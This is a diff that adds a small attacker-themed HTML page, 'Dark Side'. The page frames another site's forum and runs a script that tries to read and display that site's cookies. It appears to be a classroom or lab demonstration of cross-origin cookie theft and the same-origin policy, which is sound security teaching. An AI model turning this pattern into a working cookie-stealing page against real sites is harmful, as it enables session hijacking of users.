@@ -1,0 +1,11 @@
+<html>
+	<head><title>Dark Side</title></head>
+	<body>
+		<h1>Welcome to the dark side!</h1>
+        <iframe id="targetFrame" src="http://lightside.me/forum/"></iframe>
+        <script>
+            var doc = document.getElementById('targetFrame').contentWindow.document;
+            alert(doc.cookie);
+        </script>
+	</body>
+</html>
